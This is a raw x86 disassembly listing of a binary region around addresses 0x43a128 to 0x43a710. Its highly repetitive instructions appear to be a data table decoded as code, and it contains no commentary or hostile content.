  43a128:	add    BYTE PTR [ecx],bh
  43a12a:	inc    DWORD PTR [eax]
  43a12c:	add    BYTE PTR [ebx],ch
  43a12e:	inc    DWORD PTR [eax]
  43a130:	add    BYTE PTR [edx],ch
  43a132:	inc    DWORD PTR [eax]
  43a134:	add    BYTE PTR [edx],ch
  43a136:	inc    DWORD PTR [eax]
  43a138:	add    BYTE PTR ds:0x2f0000ff,dh
  43a13e:	inc    DWORD PTR [eax]
  43a140:	add    BYTE PTR [edx],dh
  43a142:	inc    DWORD PTR [eax]
  43a144:	add    BYTE PTR [edx],ah
  43a146:	inc    DWORD PTR [eax]
  43a148:	add    BYTE PTR [edi],bl
  43a14a:	inc    DWORD PTR [eax]
  43a14c:	add    BYTE PTR [edi+edi*8],bl
  43a14f:	add    BYTE PTR [eax],al
  43a151:	and    al,0xff
  43a153:	add    BYTE PTR [eax],al
  43a155:	and    al,0xff
  43a157:	add    BYTE PTR [eax],al
  43a159:	sbb    bh,bh
  43a15b:	add    BYTE PTR [eax],al
  43a15d:	adc    edi,edi
  43a15f:	add    BYTE PTR [eax],al
  43a161:	pop    ss
  43a162:	inc    DWORD PTR [eax]
  43a164:	add    BYTE PTR [ebx],ch
  43a166:	inc    DWORD PTR [eax]
  43a168:	add    BYTE PTR [edi+edi*8],ah
  43a16b:	add    BYTE PTR [eax],al
  43a16d:	daa    
  43a16e:	inc    DWORD PTR [eax]
  43a170:	add    BYTE PTR ds:0x290000ff,ah
  43a176:	inc    DWORD PTR [eax]
  43a178:	add    BYTE PTR ds:0x280000ff,ch
  43a17e:	inc    DWORD PTR [eax]
  43a180:	add    BYTE PTR [edi+edi*8],ah
  43a183:	add    BYTE PTR [eax],al
  43a185:	sub    al,0xff
  43a187:	add    BYTE PTR [eax],al
  43a189:	sub    eax,0x250000ff
  43a18e:	inc    DWORD PTR [eax]
  43a190:	add    BYTE PTR [edi+edi*8],ch
  43a193:	add    BYTE PTR [eax],al
  43a195:	and    bh,bh
  43a197:	add    BYTE PTR [eax],al
  43a199:	inc    DWORD PTR ss:[eax]
  43a19c:	add    BYTE PTR [edi+edi*8],ch
  43a19f:	add    BYTE PTR [eax],al
  43a1a1:	cmp    bh,bh
  43a1a3:	add    BYTE PTR [eax],al
  43a1a5:	daa    
  43a1a6:	inc    DWORD PTR [eax]
  43a1a8:	add    BYTE PTR [edi+edi*8],ch
  43a1ab:	add    BYTE PTR [eax],al
  43a1ad:	and    bh,bh
  43a1af:	add    BYTE PTR [eax],al
  43a1b1:	sbb    edi,edi
  43a1b3:	add    BYTE PTR [eax],al
  43a1b5:	das    
  43a1b6:	inc    DWORD PTR [eax]
  43a1b8:	add    BYTE PTR [edx],dh
  43a1ba:	inc    DWORD PTR [eax]
  43a1bc:	add    BYTE PTR [eax],ah
  43a1be:	inc    DWORD PTR [eax]
  43a1c0:	add    BYTE PTR [eax],ah
  43a1c2:	inc    DWORD PTR [eax]
  43a1c4:	add    BYTE PTR [eax],bh
  43a1c6:	inc    DWORD PTR [eax]
  43a1c8:	add    BYTE PTR [eax],dh
  43a1ca:	inc    DWORD PTR [eax]
  43a1cc:	add    BYTE PTR [eax],ch
  43a1ce:	inc    DWORD PTR [eax]
  43a1d0:	add    BYTE PTR [edi],ch
  43a1d2:	inc    DWORD PTR [eax]
  43a1d4:	add    BYTE PTR [edx],dh
  43a1d6:	inc    DWORD PTR [eax]
  43a1d8:	add    BYTE PTR [eax],ch
  43a1da:	inc    DWORD PTR [eax]
  43a1dc:	add    BYTE PTR [edi],bh
  43a1de:	inc    DWORD PTR [eax]
  43a1e0:	add    BYTE PTR [edx-0x1],al
  43a1e3:	add    BYTE PTR [eax],al
  43a1e5:	pop    edx
  43a1e6:	inc    DWORD PTR [eax]
  43a1e8:	add    BYTE PTR [esi],dh
  43a1ea:	inc    DWORD PTR [eax]
  43a1ec:	add    BYTE PTR [ecx],bh
  43a1ee:	inc    DWORD PTR [eax]
  43a1f0:	add    BYTE PTR [edx-0x1],al
  43a1f3:	add    BYTE PTR [eax],al
  43a1f5:	cmp    eax,0x220000ff
  43a1fa:	inc    DWORD PTR [eax]
  43a1fc:	add    BYTE PTR [ecx],dh
  43a1fe:	inc    DWORD PTR [eax]
  43a200:	add    BYTE PTR [ebx-0x1],al
  43a203:	add    BYTE PTR [eax],al
  43a205:	xor    edi,edi
  43a207:	add    BYTE PTR [eax],al
  43a209:	cmp    edi,edi
  43a20b:	add    BYTE PTR [eax],al
  43a20d:	inc    ebp
  43a20e:	inc    DWORD PTR [eax]
  43a210:	add    BYTE PTR [edi-0x1],al
  43a213:	add    BYTE PTR [eax],al
  43a215:	inc    DWORD PTR ds:[eax]
  43a218:	add    BYTE PTR [ecx-0x1],al
  43a21b:	add    BYTE PTR [eax],al
  43a21d:	inc    eax
  43a21e:	inc    DWORD PTR [eax]
  43a220:	add    BYTE PTR [ebx],bh
  43a222:	inc    DWORD PTR [eax]
  43a224:	add    BYTE PTR [ebp-0x1],cl
  43a227:	add    BYTE PTR [eax],al
  43a229:	cmp    al,0xff
  43a22b:	add    BYTE PTR [eax],al
  43a22d:	cmp    bh,bh
  43a22f:	add    BYTE PTR [eax],al
  43a231:	push   ebp
  43a232:	inc    DWORD PTR [eax]
  43a234:	add    BYTE PTR [edi+edi*8+0x0],cl
  43a238:	add    BYTE PTR [ebx-0x1],cl
  43a23b:	add    BYTE PTR [eax],al
  43a23d:	aas    
  43a23e:	inc    DWORD PTR [eax]
  43a240:	add    BYTE PTR [edi-0x1],dl
  43a243:	add    BYTE PTR [eax],al
  43a245:	aas    
  43a246:	inc    DWORD PTR [eax]
  43a248:	add    BYTE PTR [eax-0x1],dl
  43a24b:	add    BYTE PTR [eax],al
  43a24d:	inc    DWORD PTR ds:[eax]
  43a250:	add    BYTE PTR [eax-0x1],bl
  43a253:	add    BYTE PTR [eax],al
  43a255:	(bad)  
  43a256:	inc    DWORD PTR [eax]
  43a258:	add    BYTE PTR [esi],bh
  43a25a:	inc    DWORD PTR [eax]
  43a25c:	add    BYTE PTR [esi-0x1],dl
  43a25f:	add    BYTE PTR [eax],al
  43a261:	push   edx
  43a262:	inc    DWORD PTR [eax]
  43a264:	add    BYTE PTR [eax-0x1],cl
  43a267:	add    BYTE PTR [eax],al
  43a269:	inc    WORD PTR [eax]
  43a26c:	add    BYTE PTR [edi-0x1],cl
  43a26f:	add    BYTE PTR [eax],al
  43a271:	dec    ecx
  43a272:	inc    DWORD PTR [eax]
  43a274:	add    BYTE PTR [ecx-0x1],ah
  43a277:	add    BYTE PTR [eax],al
  43a279:	push   ecx
  43a27a:	inc    DWORD PTR [eax]
  43a27c:	add    BYTE PTR [edx-0x1],cl
  43a27f:	add    BYTE PTR [eax],al
  43a281:	dec    edx
  43a282:	inc    DWORD PTR [eax]
  43a284:	add    BYTE PTR [edi-0x1],al
  43a287:	add    BYTE PTR [eax],al
  43a289:	dec    esp
  43a28a:	inc    DWORD PTR [eax]
  43a28c:	add    BYTE PTR [ebx-0x1],al
  43a28f:	add    BYTE PTR [eax],al
  43a291:	aas    
  43a292:	inc    DWORD PTR [eax]
  43a294:	add    BYTE PTR [ebp-0x1],al
  43a297:	add    BYTE PTR [eax],al
  43a299:	inc    ecx
  43a29a:	inc    DWORD PTR [eax]
  43a29c:	add    BYTE PTR [esi],bh
  43a29e:	inc    DWORD PTR [eax]
  43a2a0:	add    BYTE PTR [ecx-0x1],al
  43a2a3:	add    BYTE PTR [eax],al
  43a2a5:	push   esi
  43a2a6:	inc    DWORD PTR [eax]
  43a2a8:	add    BYTE PTR [eax],bh
  43a2aa:	inc    DWORD PTR [eax]
  43a2ac:	add    BYTE PTR [edi+edi*8],dh
  43a2af:	add    BYTE PTR [eax],al
  43a2b1:	aas    
  43a2b2:	inc    DWORD PTR [eax]
  43a2b4:	add    BYTE PTR [edx],dh
  43a2b6:	inc    DWORD PTR [eax]
  43a2b8:	add    BYTE PTR [eax],bh
  43a2ba:	inc    DWORD PTR [eax]
  43a2bc:	add    BYTE PTR [ebp-0x1],al
  43a2bf:	add    BYTE PTR [eax],al
  43a2c1:	das    
  43a2c2:	inc    DWORD PTR [eax]
  43a2c4:	add    BYTE PTR ds:0x3a0000ff,dh
  43a2ca:	inc    DWORD PTR [eax]
  43a2cc:	add    BYTE PTR [ecx],bh
  43a2ce:	inc    DWORD PTR [eax]
  43a2d0:	add    BYTE PTR [edi+edi*8+0x0],cl
  43a2d4:	add    BYTE PTR [ebx],ch
  43a2d6:	inc    DWORD PTR [eax]
  43a2d8:	add    BYTE PTR [edi],dh
  43a2da:	inc    DWORD PTR [eax]
  43a2dc:	add    BYTE PTR [eax],dh
  43a2de:	inc    DWORD PTR [eax]
  43a2e0:	add    BYTE PTR [esi],ch
  43a2e2:	inc    DWORD PTR [eax]
  43a2e4:	add    BYTE PTR [edi],ch
  43a2e6:	inc    DWORD PTR [eax]
  43a2e8:	add    BYTE PTR [edi],ch
  43a2ea:	inc    DWORD PTR [eax]
  43a2ec:	add    BYTE PTR [esi],ch
  43a2ee:	inc    DWORD PTR [eax]
  43a2f0:	add    BYTE PTR [edx],ch
  43a2f2:	inc    DWORD PTR [eax]
  43a2f4:	add    BYTE PTR [edi+edi*8],dh
  43a2f7:	add    BYTE PTR [eax],al
  43a2f9:	das    
  43a2fa:	inc    DWORD PTR [eax]
  43a2fc:	add    BYTE PTR [edx],dh
  43a2fe:	inc    DWORD PTR [eax]
  43a300:	add    BYTE PTR [ecx],bh
  43a302:	inc    DWORD PTR [eax]
  43a304:	add    BYTE PTR [ebx],dh
  43a306:	inc    DWORD PTR [eax]
  43a308:	add    BYTE PTR [edi],ah
  43a30a:	inc    DWORD PTR [eax]
  43a30c:	add    BYTE PTR ds:0x270000ff,ch
  43a312:	inc    DWORD PTR [eax]
  43a314:	add    BYTE PTR [ecx],bh
  43a316:	inc    DWORD PTR [eax]
  43a318:	add    BYTE PTR [edi+edi*8],bh
  43a31b:	add    BYTE PTR [eax],al
  43a31d:	cmp    eax,0x300000ff
  43a322:	inc    DWORD PTR [eax]
  43a324:	add    BYTE PTR [edx],ch
  43a326:	inc    DWORD PTR [eax]
  43a328:	add    BYTE PTR [edi],ch
  43a32a:	inc    DWORD PTR [eax]
  43a32c:	add    BYTE PTR [esi],ch
  43a32e:	inc    DWORD PTR [eax]
  43a330:	add    BYTE PTR [ebx],ch
  43a332:	inc    DWORD PTR [eax]
  43a334:	add    BYTE PTR [ebx],ah
  43a336:	inc    DWORD PTR [eax]
  43a338:	add    BYTE PTR ds:0x220000ff,dh
  43a33e:	inc    DWORD PTR [eax]
  43a340:	add    BYTE PTR [edi],ah
  43a342:	inc    DWORD PTR [eax]
  43a344:	add    BYTE PTR [edi],bl
  43a346:	inc    DWORD PTR [eax]
  43a348:	add    BYTE PTR [esi],bl
  43a34a:	inc    DWORD PTR [eax]
  43a34c:	add    BYTE PTR ds:0x1c0000ff,bl
  43a352:	inc    DWORD PTR [eax]
  43a354:	add    BYTE PTR [edi+edi*8],ah
  43a357:	add    BYTE PTR [eax],al
  43a359:	xor    al,0xff
  43a35b:	add    BYTE PTR [eax],al
  43a35d:	adc    eax,0x1e0000ff
  43a362:	inc    DWORD PTR [eax]
  43a364:	add    BYTE PTR ds:0x2c0000ff,bl
  43a36a:	inc    DWORD PTR [eax]
  43a36c:	add    BYTE PTR [edi+edi*8],ah
  43a36f:	add    BYTE PTR [eax],al
  43a371:	daa    
  43a372:	inc    DWORD PTR [eax]
  43a374:	add    BYTE PTR [eax],ch
  43a376:	inc    DWORD PTR [eax]
  43a378:	add    BYTE PTR ds:0x260000ff,ah
  43a37e:	inc    DWORD PTR [eax]
  43a380:	add    BYTE PTR [ecx],ch
  43a382:	inc    DWORD PTR [eax]
  43a384:	add    BYTE PTR [ecx],ch
  43a386:	inc    DWORD PTR [eax]
  43a388:	add    BYTE PTR [edi],ah
  43a38a:	inc    DWORD PTR [eax]
  43a38c:	add    BYTE PTR [ecx],dh
  43a38e:	inc    DWORD PTR [eax]
  43a390:	add    BYTE PTR [edx],bh
  43a392:	inc    DWORD PTR [eax]
  43a394:	add    BYTE PTR [ecx],ch
  43a396:	inc    DWORD PTR [eax]
  43a398:	add    BYTE PTR [ecx],ch
  43a39a:	inc    DWORD PTR [eax]
  43a39c:	add    BYTE PTR ds:0x4d0000ff,bh
  43a3a2:	inc    DWORD PTR [eax]
  43a3a4:	add    BYTE PTR [ebx],ch
  43a3a6:	inc    DWORD PTR [eax]
  43a3a8:	add    BYTE PTR ds:0x3b0000ff,ch
  43a3ae:	inc    DWORD PTR [eax]
  43a3b0:	add    BYTE PTR [esi],ah
  43a3b2:	inc    DWORD PTR [eax]
  43a3b4:	add    BYTE PTR [edi],ch
  43a3b6:	inc    DWORD PTR [eax]
  43a3b8:	add    BYTE PTR ds:0x2d0000ff,bh
  43a3be:	inc    DWORD PTR [eax]
  43a3c0:	add    BYTE PTR [edx],ah
  43a3c2:	inc    DWORD PTR [eax]
  43a3c4:	add    BYTE PTR [edi],ch
  43a3c6:	inc    DWORD PTR [eax]
  43a3c8:	add    BYTE PTR [eax],ch
  43a3ca:	inc    DWORD PTR [eax]
  43a3cc:	add    BYTE PTR ds:0x340000ff,ah
  43a3d2:	inc    DWORD PTR [eax]
  43a3d4:	add    BYTE PTR [ebx],ch
  43a3d6:	inc    DWORD PTR [eax]
  43a3d8:	add    BYTE PTR [ebx],dh
  43a3da:	inc    DWORD PTR [eax]
  43a3dc:	add    BYTE PTR [edx],ch
  43a3de:	inc    DWORD PTR [eax]
  43a3e0:	add    BYTE PTR [ecx],ch
  43a3e2:	inc    DWORD PTR [eax]
  43a3e4:	add    BYTE PTR [eax],ah
  43a3e6:	inc    DWORD PTR [eax]
  43a3e8:	add    BYTE PTR [esi],dh
  43a3ea:	inc    DWORD PTR [eax]
  43a3ec:	add    BYTE PTR [esi],ch
  43a3ee:	inc    DWORD PTR [eax]
  43a3f0:	add    BYTE PTR [esi],dh
  43a3f2:	inc    DWORD PTR [eax]
  43a3f4:	add    BYTE PTR ds:0x380000ff,dh
  43a3fa:	inc    DWORD PTR [eax]
  43a3fc:	add    BYTE PTR [eax],bh
  43a3fe:	inc    DWORD PTR [eax]
  43a400:	add    BYTE PTR [edx],dh
  43a402:	inc    DWORD PTR [eax]
  43a404:	add    BYTE PTR [edi],ch
  43a406:	inc    DWORD PTR [eax]
  43a408:	add    BYTE PTR [edi+edi*8],bh
  43a40b:	add    BYTE PTR [eax],al
  43a40d:	inc    edx
  43a40e:	inc    DWORD PTR [eax]
  43a410:	add    BYTE PTR [esi],ch
  43a412:	inc    DWORD PTR [eax]
  43a414:	add    BYTE PTR [edi],ch
  43a416:	inc    DWORD PTR [eax]
  43a418:	add    BYTE PTR [ecx],bh
  43a41a:	inc    DWORD PTR [eax]
  43a41c:	add    BYTE PTR [edi],bh
  43a41e:	inc    DWORD PTR [eax]
  43a420:	add    BYTE PTR [ecx-0x1],bl
  43a423:	add    BYTE PTR [eax],al
  43a425:	pop    eax
  43a426:	inc    DWORD PTR [eax]
  43a428:	add    BYTE PTR [edi-0x1],al
  43a42b:	add    BYTE PTR [eax],al
  43a42d:	cmp    bh,bh
  43a42f:	add    BYTE PTR [eax],al
  43a431:	cmp    bh,bh
  43a433:	add    BYTE PTR [eax],al
  43a435:	dec    ebp
  43a436:	inc    DWORD PTR [eax]
  43a438:	add    BYTE PTR [edx-0x1],bl
  43a43b:	add    BYTE PTR [eax],al
  43a43d:	push   eax
  43a43e:	inc    DWORD PTR [eax]
  43a440:	add    BYTE PTR [edi-0x1],bl
  43a443:	add    BYTE PTR [eax],al
  43a445:	cmp    edi,edi
  43a447:	add    BYTE PTR [eax],al
  43a449:	push   esp
  43a44a:	inc    DWORD PTR [eax]
  43a44c:	add    BYTE PTR [esi],dh
  43a44e:	inc    DWORD PTR [eax]
  43a450:	add    BYTE PTR [eax-0x1],dl
  43a453:	add    BYTE PTR [eax],al
  43a455:	push   edi
  43a456:	inc    DWORD PTR [eax]
  43a458:	add    BYTE PTR [edi+edi*8+0x0],dl
  43a45c:	add    BYTE PTR [ebp-0x1],ch
  43a45f:	add    BYTE PTR [eax],al
  43a461:	dec    ecx
  43a462:	inc    DWORD PTR [eax]
  43a464:	add    BYTE PTR [edi],ch
  43a466:	inc    DWORD PTR [eax]
  43a468:	add    BYTE PTR [ecx-0x1],al
  43a46b:	add    BYTE PTR [eax],al
  43a46d:	push   edx
  43a46e:	inc    DWORD PTR [eax]
  43a470:	add    BYTE PTR [edx-0x1],dl
  43a473:	add    BYTE PTR [eax],al
  43a475:	inc    edx
  43a476:	inc    DWORD PTR [eax]
  43a478:	add    BYTE PTR [edx-0x1],dl
  43a47b:	add    BYTE PTR [eax],al
  43a47d:	cmp    al,0xff
  43a47f:	add    BYTE PTR [eax],al
  43a481:	cmp    edi,edi
  43a483:	add    BYTE PTR [eax],al
  43a485:	dec    ebp
  43a486:	inc    DWORD PTR [eax]
  43a488:	add    BYTE PTR [edi+edi*8+0x0],cl
  43a48c:	add    BYTE PTR [esi-0x1],cl
  43a48f:	add    BYTE PTR [eax],al
  43a491:	dec    eax
  43a492:	inc    DWORD PTR [eax]
  43a494:	add    BYTE PTR [edi+edi*8+0x0],al
  43a498:	add    BYTE PTR [eax-0x1],dl
  43a49b:	add    BYTE PTR [eax],al
  43a49d:	sub    eax,0x390000ff
  43a4a2:	inc    DWORD PTR [eax]
  43a4a4:	add    BYTE PTR [edi+edi*8+0x0],cl
  43a4a8:	add    BYTE PTR [edi+edi*8],dh
  43a4ab:	add    BYTE PTR [eax],al
  43a4ad:	xor    al,0xff
  43a4af:	add    BYTE PTR [eax],al
  43a4b1:	inc    ebx
  43a4b2:	inc    DWORD PTR [eax]
  43a4b4:	add    BYTE PTR [edx],ch
  43a4b6:	inc    DWORD PTR [eax]
  43a4b8:	add    BYTE PTR [ebx],dh
  43a4ba:	inc    DWORD PTR [eax]
  43a4bc:	add    BYTE PTR [eax-0x1],al
  43a4bf:	add    BYTE PTR [eax],al
  43a4c1:	inc    edx
  43a4c2:	inc    DWORD PTR [eax]
  43a4c4:	add    BYTE PTR [eax-0x1],dl
  43a4c7:	add    BYTE PTR [eax],al
  43a4c9:	inc    eax
  43a4ca:	inc    DWORD PTR [eax]
  43a4cc:	add    BYTE PTR [edx],bh
  43a4ce:	inc    DWORD PTR [eax]
  43a4d0:	add    BYTE PTR [edi-0x1],cl
  43a4d3:	add    BYTE PTR [eax],al
  43a4d5:	dec    eax
  43a4d6:	inc    DWORD PTR [eax]
  43a4d8:	add    BYTE PTR [edi-0x1],cl
  43a4db:	add    BYTE PTR [eax],al
  43a4dd:	inc    edx
  43a4de:	inc    DWORD PTR [eax]
  43a4e0:	add    BYTE PTR [edx-0x1],al
  43a4e3:	add    BYTE PTR [eax],al
  43a4e5:	pop    ds
  43a4e6:	inc    DWORD PTR [eax]
  43a4e8:	add    BYTE PTR [ebx],dh
  43a4ea:	inc    DWORD PTR [eax]
  43a4ec:	add    BYTE PTR [eax-0x1],al
  43a4ef:	add    BYTE PTR [eax],al
  43a4f1:	cmp    bh,bh
  43a4f3:	add    BYTE PTR [eax],al
  43a4f5:	sbb    bh,bh
  43a4f7:	add    BYTE PTR [eax],al
  43a4f9:	sub    eax,0x3d0000ff
  43a4fe:	inc    DWORD PTR [eax]
  43a500:	add    BYTE PTR [ecx-0x1],al
  43a503:	add    BYTE PTR [eax],al
  43a505:	inc    ecx
  43a506:	inc    DWORD PTR [eax]
  43a508:	add    BYTE PTR [eax],ch
  43a50a:	inc    DWORD PTR [eax]
  43a50c:	add    BYTE PTR [edi+edi*8],ch
  43a50f:	add    BYTE PTR [eax],al
  43a511:	cmp    al,0xff
  43a513:	add    BYTE PTR [eax],al
  43a515:	sub    edi,edi
  43a517:	add    BYTE PTR [eax],al
  43a519:	sub    edi,edi
  43a51b:	add    BYTE PTR [eax],al
  43a51d:	inc    DWORD PTR ds:[eax]
  43a520:	add    BYTE PTR [edi],dh
  43a522:	inc    DWORD PTR [eax]
  43a524:	add    BYTE PTR [eax],bh
  43a526:	inc    DWORD PTR [eax]
  43a528:	add    BYTE PTR [edi+edi*8],ah
  43a52b:	add    BYTE PTR [eax],al
  43a52d:	daa    
  43a52e:	inc    DWORD PTR [eax]
  43a530:	add    BYTE PTR ds:0x350000ff,ch
  43a536:	inc    DWORD PTR [eax]
  43a538:	add    BYTE PTR ds:0x260000ff,ch
  43a53e:	inc    DWORD PTR [eax]
  43a540:	add    BYTE PTR [ecx],ch
  43a542:	inc    DWORD PTR [eax]
  43a544:	add    BYTE PTR ds:0x200000ff,bl
  43a54a:	inc    DWORD PTR [eax]
  43a54c:	add    BYTE PTR ds:0x1c0000ff,ah
  43a552:	inc    DWORD PTR [eax]
  43a554:	add    BYTE PTR [edx],ch
  43a556:	inc    DWORD PTR [eax]
  43a558:	add    BYTE PTR [eax],dh
  43a55a:	inc    DWORD PTR [eax]
  43a55c:	add    BYTE PTR [edi+edi*8],dh
  43a55f:	add    BYTE PTR [eax],al
  43a561:	xor    al,0xff
  43a563:	add    BYTE PTR [eax],al
  43a565:	sub    bh,bh
  43a567:	add    BYTE PTR [eax],al
  43a569:	sub    al,0xff
  43a56b:	add    BYTE PTR [eax],al
  43a56d:	xor    edi,edi
  43a56f:	add    BYTE PTR [eax],al
  43a571:	xor    edi,edi
  43a573:	add    BYTE PTR [eax],al
  43a575:	inc    DWORD PTR cs:[eax]
  43a578:	add    BYTE PTR [eax],bh
  43a57a:	inc    DWORD PTR [eax]
  43a57c:	add    BYTE PTR [edi],ah
  43a57e:	inc    DWORD PTR [eax]
  43a580:	add    BYTE PTR ds:0x280000ff,ah
  43a586:	inc    DWORD PTR [eax]
  43a588:	add    BYTE PTR [edi],ch
  43a58a:	inc    DWORD PTR [eax]
  43a58c:	add    BYTE PTR [eax],ch
  43a58e:	inc    DWORD PTR [eax]
  43a590:	add    BYTE PTR ds:0x1e0000ff,ah
  43a596:	inc    DWORD PTR [eax]
  43a598:	add    BYTE PTR [edx],dh
  43a59a:	inc    DWORD PTR [eax]
  43a59c:	add    BYTE PTR [edx],bl
  43a59e:	inc    DWORD PTR [eax]
  43a5a0:	add    BYTE PTR [edi],ch
  43a5a2:	inc    DWORD PTR [eax]
  43a5a4:	add    BYTE PTR [edi+edi*8],ch
  43a5a7:	add    BYTE PTR [eax],al
  43a5a9:	inc    edx
  43a5aa:	inc    DWORD PTR [eax]
  43a5ac:	add    BYTE PTR [edx-0x1],dl
  43a5af:	add    BYTE PTR [eax],al
  43a5b1:	aaa    
  43a5b2:	inc    DWORD PTR [eax]
  43a5b4:	add    BYTE PTR [ecx],bh
  43a5b6:	inc    DWORD PTR [eax]
  43a5b8:	add    BYTE PTR [edx-0x1],al
  43a5bb:	add    BYTE PTR [eax],al
  43a5bd:	inc    DWORD PTR ss:[eax]
  43a5c0:	add    BYTE PTR [eax],bh
  43a5c2:	inc    DWORD PTR [eax]
  43a5c4:	add    BYTE PTR [edx],dh
  43a5c6:	inc    DWORD PTR [eax]
  43a5c8:	add    BYTE PTR [edi-0x1],al
  43a5cb:	add    BYTE PTR [eax],al
  43a5cd:	cmp    edi,edi
  43a5cf:	add    BYTE PTR [eax],al
  43a5d1:	daa    
  43a5d2:	inc    DWORD PTR [eax]
  43a5d4:	add    BYTE PTR ds:0x350000ff,dh
  43a5da:	inc    DWORD PTR [eax]
  43a5dc:	add    BYTE PTR [ecx],bl
  43a5de:	inc    DWORD PTR [eax]
  43a5e0:	add    BYTE PTR [ecx],ah
  43a5e2:	inc    DWORD PTR [eax]
  43a5e4:	add    BYTE PTR ds:0x330000ff,ah
  43a5ea:	inc    DWORD PTR [eax]
  43a5ec:	add    BYTE PTR [esi],dh
  43a5ee:	inc    DWORD PTR [eax]
  43a5f0:	add    BYTE PTR [esi],bh
  43a5f2:	inc    DWORD PTR [eax]
  43a5f4:	add    BYTE PTR [edi+edi*8+0x0],dl
  43a5f8:	add    BYTE PTR [eax],bh
  43a5fa:	inc    DWORD PTR [eax]
  43a5fc:	add    BYTE PTR [eax],bh
  43a5fe:	inc    DWORD PTR [eax]
  43a600:	add    BYTE PTR [edi+edi*8],dh
  43a603:	add    BYTE PTR [eax],al
  43a605:	inc    edx
  43a606:	inc    DWORD PTR [eax]
  43a608:	add    BYTE PTR [ecx],bh
  43a60a:	inc    DWORD PTR [eax]
  43a60c:	add    BYTE PTR [esi],dh
  43a60e:	inc    DWORD PTR [eax]
  43a610:	add    BYTE PTR [eax],bh
  43a612:	inc    DWORD PTR [eax]
  43a614:	add    BYTE PTR [ebx],bh
  43a616:	inc    DWORD PTR [eax]
  43a618:	add    BYTE PTR [ecx-0x1],al
  43a61b:	add    BYTE PTR [eax],al
  43a61d:	xor    edi,edi
  43a61f:	add    BYTE PTR [eax],al
  43a621:	dec    ecx
  43a622:	inc    DWORD PTR [eax]
  43a624:	add    BYTE PTR [ebx-0x1],al
  43a627:	add    BYTE PTR [eax],al
  43a629:	cmp    al,0xff
  43a62b:	add    BYTE PTR [eax],al
  43a62d:	inc    edi
  43a62e:	inc    DWORD PTR [eax]
  43a630:	add    BYTE PTR [edx-0x1],cl
  43a633:	add    BYTE PTR [eax],al
  43a635:	inc    eax
  43a636:	inc    DWORD PTR [eax]
  43a638:	add    BYTE PTR [ebx-0x1],dl
  43a63b:	add    BYTE PTR [eax],al
  43a63d:	push   edx
  43a63e:	inc    DWORD PTR [eax]
  43a640:	add    BYTE PTR [eax-0x1],bl
  43a643:	add    BYTE PTR [eax],al
  43a645:	dec    esp
  43a646:	inc    DWORD PTR [eax]
  43a648:	add    BYTE PTR [esi],dh
  43a64a:	inc    DWORD PTR [eax]
  43a64c:	add    BYTE PTR [ebp-0x1],al
  43a64f:	add    BYTE PTR [eax],al
  43a651:	dec    ecx
  43a652:	inc    DWORD PTR [eax]
  43a654:	add    BYTE PTR [eax-0x1],dl
  43a657:	add    BYTE PTR [eax],al
  43a659:	dec    esp
  43a65a:	inc    DWORD PTR [eax]
  43a65c:	add    BYTE PTR [esi-0x1],cl
  43a65f:	add    BYTE PTR [eax],al
  43a661:	dec    esi
  43a662:	inc    DWORD PTR [eax]
  43a664:	add    BYTE PTR [eax-0x1],bl
  43a667:	add    BYTE PTR [eax],al
  43a669:	inc    esp
  43a66a:	inc    DWORD PTR [eax]
  43a66c:	add    BYTE PTR [edx-0x1],cl
  43a66f:	add    BYTE PTR [eax],al
  43a671:	cmp    bh,bh
  43a673:	add    BYTE PTR [eax],al
  43a675:	inc    esi
  43a676:	inc    DWORD PTR [eax]
  43a678:	add    BYTE PTR [esi],bh
  43a67a:	inc    DWORD PTR [eax]
  43a67c:	add    BYTE PTR [eax-0x1],al
  43a67f:	add    BYTE PTR [eax],al
  43a681:	dec    esi
  43a682:	inc    DWORD PTR [eax]
  43a684:	add    BYTE PTR [ebp-0x1],al
  43a687:	add    BYTE PTR [eax],al
  43a689:	dec    ebp
  43a68a:	inc    DWORD PTR [eax]
  43a68c:	add    BYTE PTR [eax-0x1],al
  43a68f:	add    BYTE PTR [eax],al
  43a691:	cmp    al,0xff
  43a693:	add    BYTE PTR [eax],al
  43a695:	inc    ebx
  43a696:	inc    DWORD PTR [eax]
  43a698:	add    BYTE PTR [esi],bh
  43a69a:	inc    DWORD PTR [eax]
  43a69c:	add    BYTE PTR [edx],bh
  43a69e:	inc    DWORD PTR [eax]
  43a6a0:	add    BYTE PTR [ebx],bh
  43a6a2:	inc    DWORD PTR [eax]
  43a6a4:	add    BYTE PTR [edx],dh
  43a6a6:	inc    DWORD PTR [eax]
  43a6a8:	add    BYTE PTR [esi-0x1],al
  43a6ab:	add    BYTE PTR [eax],al
  43a6ad:	dec    esi
  43a6ae:	inc    DWORD PTR [eax]
  43a6b0:	add    BYTE PTR [eax-0x1],cl
  43a6b3:	add    BYTE PTR [eax],al
  43a6b5:	inc    esi
  43a6b6:	inc    DWORD PTR [eax]
  43a6b8:	add    BYTE PTR [esi-0x1],al
  43a6bb:	add    BYTE PTR [eax],al
  43a6bd:	push   eax
  43a6be:	inc    DWORD PTR [eax]
  43a6c0:	add    BYTE PTR [edi],bh
  43a6c2:	inc    DWORD PTR [eax]
  43a6c4:	add    BYTE PTR [esi-0x1],al
  43a6c7:	add    BYTE PTR [eax],al
  43a6c9:	inc    edx
  43a6ca:	inc    DWORD PTR [eax]
  43a6cc:	add    BYTE PTR [edi],dh
  43a6ce:	inc    DWORD PTR [eax]
  43a6d0:	add    BYTE PTR ds:0x410000ff,bh
  43a6d6:	inc    DWORD PTR [eax]
  43a6d8:	add    BYTE PTR [ecx],ch
  43a6da:	inc    DWORD PTR [eax]
  43a6dc:	add    BYTE PTR ds:0x430000ff,dh
  43a6e2:	inc    DWORD PTR [eax]
  43a6e4:	add    BYTE PTR ds:0x2a0000ff,dh
  43a6ea:	inc    DWORD PTR [eax]
  43a6ec:	add    BYTE PTR [esi],ah
  43a6ee:	inc    DWORD PTR [eax]
  43a6f0:	add    BYTE PTR [ebx],ch
  43a6f2:	inc    DWORD PTR [eax]
  43a6f4:	add    BYTE PTR [eax],ch
  43a6f6:	inc    DWORD PTR [eax]
  43a6f8:	add    BYTE PTR [ebx],ch
  43a6fa:	inc    DWORD PTR [eax]
  43a6fc:	add    BYTE PTR [esi],dh
  43a6fe:	inc    DWORD PTR [eax]
  43a700:	add    BYTE PTR [edi],ah
  43a702:	inc    DWORD PTR [eax]
  43a704:	add    BYTE PTR [eax],bh
  43a706:	inc    DWORD PTR [eax]
  43a708:	add    BYTE PTR [edx],ah
  43a70a:	inc    DWORD PTR [eax]
  43a70c:	add    BYTE PTR [ebx],ah
  43a70e:	inc    DWORD PTR [eax]
  43a710:	add    BYTE PTR [eax],bh
